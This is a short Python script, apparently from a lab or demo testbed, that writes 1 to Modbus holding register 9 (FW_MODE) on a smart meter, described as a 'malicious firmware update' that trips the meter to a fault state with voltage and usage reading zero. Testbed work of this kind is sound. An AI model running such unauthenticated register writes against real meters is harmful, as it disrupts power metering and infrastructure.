#!/usr/bin/env python3
"""Inject the 'malicious firmware update': FW_MODE := 1 (trips the meter to fault).

Usage: ./mb_trip.py [host]   (default host 192.168.1.210)
This is the direct-Modbus stand-in for the RF listener's write.
"""
import sys
import mb

host = sys.argv[1] if len(sys.argv) > 1 else mb.DEFAULT_HOST
mb.write_register(9, 1, host=host)      # FW_MODE (holding reg 9) := 1
print("FW_MODE := 1  — meter tripped to fault (red, voltage/usage -> 0)")
